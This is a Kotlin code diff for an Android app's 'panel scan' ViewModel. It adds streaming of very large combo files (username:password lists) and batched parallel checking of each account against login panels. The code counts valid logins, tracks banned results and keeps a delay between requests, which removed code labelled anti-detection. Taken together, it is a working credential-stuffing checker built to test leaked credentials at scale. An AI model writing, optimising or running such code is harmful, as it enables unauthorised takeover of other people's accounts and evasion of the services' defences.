@@ -17,6 +17,8 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.sync.Semaphore
 import kotlinx.coroutines.sync.withPermit
 import kotlinx.coroutines.withContext
+import android.content.Context
+import android.net.Uri
 import java.io.InputStream
 import javax.inject.Inject
 
@@ -94,32 +96,42 @@ class PanelScanViewModel @Inject constructor(
     val state: StateFlow<PanelScanState> = _state.asStateFlow()
     
     private var scanJob: kotlinx.coroutines.Job? = null
+    
+    // 🔥 STREAMING YAKLAŞIMI - Dosyayı belleğe yüklemiyoruz!
+    // Sadece URI ve satır sayısını saklıyoruz
+    private var comboFileUri: Uri? = null
+    private var appContext: Context? = null
 
     fun setComboText(text: String) {
         val lineCount = text.lines().count { it.contains(":") }
         _state.update { it.copy(comboText = text, comboLineCount = lineCount) }
     }
     
-    // Hesapları bellekte tutmak yerine ayrı listede tut
+    // Artık hesapları bellekte TUTMUYORUZ - sadece küçük dosyalar için
     private var loadedAccounts: MutableList<String> = mutableListOf()
+    private val MAX_MEMORY_ACCOUNTS = 50000 // 50K'dan fazla hesap varsa streaming kullan
     
     /**
-     * 🔥 ULTRA OPTİMİZE Combo Yükleme - 1GB+ Dosya Desteği
+     * 🔥 SIFIR BELLEK KULLANIMI - Sadece satır sayısını say!
      * 
-     * Yaratıcı çözüm: Dosyayı CHUNK'lar halinde okur, UI'ı bloklamaz
-     * - Her 5000 satırda bir UI güncellenir
-     * - Bellek taşmasını önlemek için StringBuilder kullanılmaz
-     * - Progress göstergesi ile kullanıcı bilgilendirilir
+     * Dosyayı belleğe YÜKLEMEZ, sadece:
+     * 1. Satır sayısını sayar
+     * 2. URI'yi saklar (tarama sırasında kullanılacak)
+     * 
+     * Tarama başladığında dosyadan STREAMING okuma yapılır
      */
-    fun loadComboFromStream(inputStream: InputStream, fileSize: Long = 0, onComplete: (Int) -> Unit = {}) {
+    fun countLinesOnly(context: Context, uri: Uri, fileSize: Long = 0, onComplete: (Int) -> Unit = {}) {
+        // Context ve URI'yi sakla - tarama sırasında kullanılacak
+        appContext = context.applicationContext
+        comboFileUri = uri
+        
         viewModelScope.launch(Dispatchers.IO) {
             try {
-                // Loading başlat
                 _state.update { 
                     it.copy(
                         isLoadingFile = true,
                         loadingProgress = 0f,
-                        loadingMessage = "📂 Dosya açılıyor...",
+                        loadingMessage = "� Hesap sayısı hesaplanıyor...",
                         errorMessage = null
                     ) 
                 }
@@ -127,27 +139,30 @@ class PanelScanViewModel @Inject constructor(
                 loadedAccounts.clear()
                 var lineCount = 0
                 var bytesRead = 0L
-                val buffer = CharArray(8192) // 8KB buffer
+                val buffer = CharArray(32768) // 32KB buffer - daha hızlı sayma
                 
-                val reader = inputStream.bufferedReader()
+                val inputStream = context.contentResolver.openInputStream(uri)
+                val reader = inputStream?.bufferedReader() ?: return@launch
                 val lineBuilder = StringBuilder()
                 
-                // Chunk-based okuma - UI'ı bloklamaz
+                // SADECE SAYMA - Belleğe ekleme yok!
                 while (true) {
                     val charsRead = reader.read(buffer)
                     if (charsRead == -1) break
                     
-                    bytesRead += charsRead * 2 // UTF-16
+                    bytesRead += charsRead
                     
-                    // Buffer'ı işle
                     for (i in 0 until charsRead) {
                         val char = buffer[i]
                         if (char == '\n' || char == '\r') {
                             if (lineBuilder.isNotEmpty()) {
                                 val line = lineBuilder.toString()
                                 if (line.contains(":") && !line.startsWith("#")) {
-                                    loadedAccounts.add(line)
                                     lineCount++
+                                    // Sadece küçük dosyalar için belleğe al
+                                    if (lineCount <= MAX_MEMORY_ACCOUNTS) {
+                                        loadedAccounts.add(line)
+                                    }
                                 }
                                 lineBuilder.clear()
                             }
@@ -156,40 +171,44 @@ class PanelScanViewModel @Inject constructor(
                         }
                     }
                     
-                    // Her 5000 satırda bir UI güncelle (performans için)
-                    if (lineCount % 5000 == 0 && lineCount > 0) {
+                    // Her 10000 satırda bir UI güncelle
+                    if (lineCount % 10000 == 0 && lineCount > 0) {
                         val progress = if (fileSize > 0) (bytesRead.toFloat() / fileSize).coerceIn(0f, 1f) else 0f
                         _state.update { 
                             it.copy(
                                 loadingProgress = progress,
-                                loadingMessage = "📊 $lineCount hesap bulundu...",
+                                loadingMessage = "📊 $lineCount hesap sayıldı...",
                                 comboLineCount = lineCount
                             ) 
                         }
-                        // UI'ın nefes alması için küçük bir bekleme
                         kotlinx.coroutines.yield()
                     }
                 }
                 
-                // Son satırı işle
+                // Son satır
                 if (lineBuilder.isNotEmpty()) {
                     val line = lineBuilder.toString()
                     if (line.contains(":") && !line.startsWith("#")) {
-                        loadedAccounts.add(line)
                         lineCount++
+                        if (lineCount <= MAX_MEMORY_ACCOUNTS) {
+                            loadedAccounts.add(line)
+                        }
                     }
                 }
                 
                 reader.close()
                 
-                // Sonuçları state'e yaz - SADECE satır sayısı, tüm text değil!
+                val useStreaming = lineCount > MAX_MEMORY_ACCOUNTS
                 _state.update { 
                     it.copy(
-                        comboText = if (lineCount <= 10000) loadedAccounts.joinToString("\n") else "[${lineCount} hesap yüklendi - bellekte tutulmadı]",
+                        comboText = if (useStreaming) "[STREAMING: $lineCount hesap - tarama sırasında okunacak]" else "",
                         comboLineCount = lineCount,
                         isLoadingFile = false,
                         loadingProgress = 1f,
-                        loadingMessage = "✅ $lineCount hesap yüklendi!"
+                        loadingMessage = if (useStreaming) 
+                            "✅ $lineCount hesap bulundu (Streaming mod aktif)" 
+                        else 
+                            "✅ $lineCount hesap yüklendi"
                     ) 
                 }
                 
@@ -204,6 +223,12 @@ class PanelScanViewModel @Inject constructor(
                 }
             }
         }
+    }
+    
+    // Eski fonksiyon - geriye uyumluluk için
+    fun loadComboFromStream(inputStream: InputStream, fileSize: Long = 0, onComplete: (Int) -> Unit = {}) {
+        // Bu artık kullanılmayacak, ama eski kod için bırakıyoruz
+        onComplete(0)
     }
     
     /**
@@ -335,13 +360,15 @@ class PanelScanViewModel @Inject constructor(
     }
 
     /**
-     * 🔥 ULTRA HIZLI PARALEL TARAMA
-     * Seçilen attack modu ve hız ayarlarına göre tarama yapar
+     * 🔥 STREAMING TARAMA - Sınırsız hesap desteği!
+     * 
+     * Küçük dosyalar: Bellekteki hesapları kullan
+     * Büyük dosyalar: Dosyadan chunk chunk oku ve tara
      */
     fun startScan() {
         val currentState = _state.value
         
-        // Combo kontrolü - artık comboLineCount kullanıyoruz
+        // Combo kontrolü
         if (currentState.comboLineCount == 0 && loadedAccounts.isEmpty()) {
             _state.update { it.copy(errorMessage = "Lütfen combo dosyası seçin") }
             return
@@ -354,6 +381,9 @@ class PanelScanViewModel @Inject constructor(
             _state.update { it.copy(errorMessage = "Lütfen panel URL'si girin veya gömülü panelleri aktif edin") }
             return
         }
+
+        // Streaming mi kullanılacak?
+        val useStreaming = currentState.comboLineCount > MAX_MEMORY_ACCOUNTS && comboFileUri != null && appContext != null
 
         scanJob = viewModelScope.launch {
             val startTime = System.currentTimeMillis()
@@ -369,26 +399,6 @@ class PanelScanViewModel @Inject constructor(
             }
 
             try {
-                // Hesapları al - önce loadedAccounts, yoksa comboText'ten parse et
-                val accounts = if (loadedAccounts.isNotEmpty()) {
-                    loadedAccounts.map { line ->
-                        val parts = line.split(":")
-                        ComboAccount(parts[0], parts.getOrElse(1) { "" })
-                    }
-                } else {
-                    panelScanner.parseComboFile(currentState.comboText)
-                }
-                
-                if (accounts.isEmpty()) {
-                    _state.update { 
-                        it.copy(
-                            scanning = false,
-                            errorMessage = "Geçerli hesap bulunamadı. Format: kullanici:sifre"
-                        ) 
-                    }
-                    return@launch
-                }
-
                 // Get panels to scan
                 val panelsToScan = mutableListOf<PanelInfo>()
                 
@@ -412,79 +422,177 @@ class PanelScanViewModel @Inject constructor(
                     return@launch
                 }
 
-                val totalScans = accounts.size * panelsToScan.size
                 val results = mutableListOf<PanelScanResult>()
                 var validCount = 0
                 var invalidCount = 0
                 var errorCount = 0
+                var totalScanned = 0
+                val totalAccounts = currentState.comboLineCount
                 val delayMs = currentState.scanSpeed.delayMs
+                val concurrency = currentState.scanSpeed.concurrency
 
-                // 🔥 PARALEL TARAMA - Çok daha hızlı
                 withContext(Dispatchers.IO) {
-                    val semaphore = Semaphore(currentState.scanSpeed.concurrency)
-                    var currentScan = 0
+                    val semaphore = Semaphore(concurrency)
                     
-                    val jobs = accounts.flatMap { account ->
-                        panelsToScan.map { panel ->
-                            async {
-                                semaphore.withPermit {
-                                    try {
-                                        val result = panelScanner.scanAccount(account, panel)
-                                        
+                    if (useStreaming) {
+                        // 🔥 STREAMING MODU - Dosyadan chunk chunk oku
+                        val ctx = appContext!!
+                        val uri = comboFileUri!!
+                        val chunkSize = 1000 // Her seferde 1000 hesap oku
+                        
+                        val inputStream = ctx.contentResolver.openInputStream(uri)
+                        val reader = inputStream?.bufferedReader() ?: return@withContext
+                        
+                        val accountBatch = mutableListOf<ComboAccount>()
+                        var line: String?
+                        
+                        while (reader.readLine().also { line = it } != null) {
+                            val currentLine = line ?: continue
+                            if (currentLine.contains(":") && !currentLine.startsWith("#")) {
+                                val parts = currentLine.split(":")
+                                if (parts.size >= 2) {
+                                    accountBatch.add(ComboAccount(parts[0], parts[1]))
+                                }
+                            }
+                            
+                            // Batch dolduğunda tara
+                            if (accountBatch.size >= chunkSize) {
+                                // Bu batch'i tara
+                                val batchResults = scanBatch(
+                                    accounts = accountBatch.toList(),
+                                    panels = panelsToScan,
+                                    semaphore = semaphore,
+                                    delayMs = delayMs,
+                                    startTime = startTime,
+                                    totalAccounts = totalAccounts,
+                                    currentOffset = totalScanned,
+                                    onProgress = { scanned, valid, invalid, error ->
+                                        totalScanned = scanned
+                                        validCount = valid
+                                        invalidCount = invalid
+                                        errorCount = error
+                                    },
+                                    onResult = { result ->
                                         synchronized(results) {
-                                            currentScan++
+                                            results.add(result)
+                                            _state.update { s -> s.copy(results = results.toList()) }
+                                        }
+                                    }
+                                )
+                                
+                                accountBatch.clear()
+                                kotlinx.coroutines.yield()
+                            }
+                        }
+                        
+                        // Kalan hesapları tara
+                        if (accountBatch.isNotEmpty()) {
+                            scanBatch(
+                                accounts = accountBatch.toList(),
+                                panels = panelsToScan,
+                                semaphore = semaphore,
+                                delayMs = delayMs,
+                                startTime = startTime,
+                                totalAccounts = totalAccounts,
+                                currentOffset = totalScanned,
+                                onProgress = { scanned, valid, invalid, error ->
+                                    totalScanned = scanned
+                                    validCount = valid
+                                    invalidCount = invalid
+                                    errorCount = error
+                                },
+                                onResult = { result ->
+                                    synchronized(results) {
+                                        results.add(result)
+                                        _state.update { s -> s.copy(results = results.toList()) }
+                                    }
+                                }
+                            )
+                        }
+                        
+                        reader.close()
+                        
+                    } else {
+                        // Normal mod - bellekteki hesapları kullan
+                        val accounts = if (loadedAccounts.isNotEmpty()) {
+                            loadedAccounts.map { line ->
+                                val parts = line.split(":")
+                                ComboAccount(parts[0], parts.getOrElse(1) { "" })
+                            }
+                        } else {
+                            panelScanner.parseComboFile(currentState.comboText)
+                        }
+                        
+                        if (accounts.isEmpty()) {
+                            _state.update { 
+                                it.copy(
+                                    scanning = false,
+                                    errorMessage = "Geçerli hesap bulunamadı"
+                                ) 
+                            }
+                            return@withContext
+                        }
+                        
+                        val totalScans = accounts.size * panelsToScan.size
+                        var currentScan = 0
+                        
+                        val jobs = accounts.flatMap { account ->
+                            panelsToScan.map { panel ->
+                                async {
+                                    semaphore.withPermit {
+                                        try {
+                                            val result = panelScanner.scanAccount(account, panel)
                                             
-                                            when (result.status) {
-                                                is ScanStatus.Valid -> {
-                                                    validCount++
-                                                    results.add(result)
-                                                    // Hit bulunduğunda hemen UI'ı güncelle
-                                                    _state.update { s -> s.copy(results = results.toList()) }
-                                                }
-                                                is ScanStatus.Invalid -> invalidCount++
-                                                is ScanStatus.Error -> errorCount++
-                                                is ScanStatus.Banned -> errorCount++
-                                                else -> {}
-                                            }
-                                            
-                                            // Her 50 taramada bir progress güncelle (performans için)
-                                            if (currentScan % 50 == 0 || currentScan == totalScans) {
-                                                val elapsed = (System.currentTimeMillis() - startTime) / 1000f
-                                                val speed = if (elapsed > 0) currentScan / elapsed else 0f
+                                            synchronized(results) {
+                                                currentScan++
                                                 
-                                                _state.update { s -> 
-                                                    s.copy(
-                                                        progress = ScanProgress(
-                                                            current = currentScan,
-                                                            total = totalScans,
-                                                            currentAccount = "${account.username}:***",
-                                                            validCount = validCount,
-                                                            invalidCount = invalidCount,
-                                                            errorCount = errorCount,
-                                                            speedPerSecond = speed
-                                                        ),
-                                                        totalScanned = currentScan
-                                                    ) 
+                                                when (result.status) {
+                                                    is ScanStatus.Valid -> {
+                                                        validCount++
+                                                        results.add(result)
+                                                        _state.update { s -> s.copy(results = results.toList()) }
+                                                    }
+                                                    is ScanStatus.Invalid -> invalidCount++
+                                                    is ScanStatus.Error -> errorCount++
+                                                    is ScanStatus.Banned -> errorCount++
+                                                    else -> {}
+                                                }
+                                                
+                                                if (currentScan % 50 == 0 || currentScan == totalScans) {
+                                                    val elapsed = (System.currentTimeMillis() - startTime) / 1000f
+                                                    val speed = if (elapsed > 0) currentScan / elapsed else 0f
+                                                    
+                                                    _state.update { s -> 
+                                                        s.copy(
+                                                            progress = ScanProgress(
+                                                                current = currentScan,
+                                                                total = totalScans,
+                                                                currentAccount = "${account.username}:***",
+                                                                validCount = validCount,
+                                                                invalidCount = invalidCount,
+                                                                errorCount = errorCount,
+                                                                speedPerSecond = speed
+                                                            ),
+                                                            totalScanned = currentScan
+                                                        ) 
+                                                    }
                                                 }
                                             }
+                                            
+                                            if (delayMs > 0) delay(delayMs)
+                                            result
+                                        } catch (e: Exception) {
+                                            synchronized(results) { errorCount++ }
+                                            null
                                         }
-                                        
-                                        // Anti-detection delay
-                                        if (delayMs > 0) {
-                                            delay(delayMs)
-                                        }
-                                        
-                                        result
-                                    } catch (e: Exception) {
-                                        synchronized(results) { errorCount++ }
-                                        null
                                     }
                                 }
                             }
                         }
+                        
+                        jobs.awaitAll()
+                        totalScanned = accounts.size
                     }
-                    
-                    jobs.awaitAll()
                 }
 
                 // Final update
@@ -494,18 +602,17 @@ class PanelScanViewModel @Inject constructor(
                         scanning = false,
                         showSaveDialog = results.isNotEmpty(),
                         progress = ScanProgress(
-                            current = totalScans,
-                            total = totalScans,
+                            current = totalScanned * panelsToScan.size,
+                            total = totalAccounts * panelsToScan.size,
                             validCount = validCount,
                             invalidCount = invalidCount,
                             errorCount = errorCount,
-                            speedPerSecond = if (totalTime > 0) totalScans / totalTime else 0f
+                            speedPerSecond = if (totalTime > 0) totalScanned / totalTime else 0f
                         )
                     ) 
                 }
 
             } catch (e: kotlinx.coroutines.CancellationException) {
-                // Kullanıcı durdurdu
                 _state.update { 
                     it.copy(
                         scanning = false,
@@ -521,6 +628,84 @@ class PanelScanViewModel @Inject constructor(
                 }
             }
         }
+    }
+    
+    /**
+     * Batch tarama - chunk chunk hesapları tarar
+     */
+    private suspend fun scanBatch(
+        accounts: List<ComboAccount>,
+        panels: List<PanelInfo>,
+        semaphore: Semaphore,
+        delayMs: Long,
+        startTime: Long,
+        totalAccounts: Int,
+        currentOffset: Int,
+        onProgress: (scanned: Int, valid: Int, invalid: Int, error: Int) -> Unit,
+        onResult: (PanelScanResult) -> Unit
+    ) {
+        var validCount = 0
+        var invalidCount = 0
+        var errorCount = 0
+        var scanned = currentOffset
+        
+        val jobs = accounts.flatMap { account ->
+            panels.map { panel ->
+                viewModelScope.async(Dispatchers.IO) {
+                    semaphore.withPermit {
+                        try {
+                            val result = panelScanner.scanAccount(account, panel)
+                            
+                            synchronized(this) {
+                                scanned++
+                                
+                                when (result.status) {
+                                    is ScanStatus.Valid -> {
+                                        validCount++
+                                        onResult(result)
+                                    }
+                                    is ScanStatus.Invalid -> invalidCount++
+                                    is ScanStatus.Error -> errorCount++
+                                    is ScanStatus.Banned -> errorCount++
+                                    else -> {}
+                                }
+                                
+                                if (scanned % 100 == 0) {
+                                    val elapsed = (System.currentTimeMillis() - startTime) / 1000f
+                                    val speed = if (elapsed > 0) scanned / elapsed else 0f
+                                    
+                                    _state.update { s -> 
+                                        s.copy(
+                                            progress = ScanProgress(
+                                                current = scanned * panels.size,
+                                                total = totalAccounts * panels.size,
+                                                currentAccount = "${account.username}:***",
+                                                validCount = validCount,
+                                                invalidCount = invalidCount,
+                                                errorCount = errorCount,
+                                                speedPerSecond = speed
+                                            ),
+                                            totalScanned = scanned
+                                        ) 
+                                    }
+                                    
+                                    onProgress(scanned, validCount, invalidCount, errorCount)
+                                }
+                            }
+                            
+                            if (delayMs > 0) delay(delayMs)
+                            result
+                        } catch (e: Exception) {
+                            synchronized(this) { errorCount++ }
+                            null
+                        }
+                    }
+                }
+            }
+        }
+        
+        jobs.awaitAll()
+        onProgress(scanned, validCount, invalidCount, errorCount)
     }
 
     fun clearResults() {
